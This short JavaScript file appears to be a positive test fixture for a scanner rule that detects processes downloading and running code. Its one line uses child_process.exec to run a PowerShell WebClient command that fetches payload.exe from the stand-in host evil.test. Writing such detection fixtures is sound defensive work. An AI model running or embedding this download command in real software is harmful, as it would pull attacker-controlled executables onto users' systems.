// Positive test for threat-process-download-exec.
// A PowerShell WebClient download-and-execute one-liner embedded in a
// spawned command string.
child_process.exec('powershell -Command "(New-Object Net.WebClient).DownloadFile(\'http://evil.test/payload.exe\',\'payload.exe\')"');
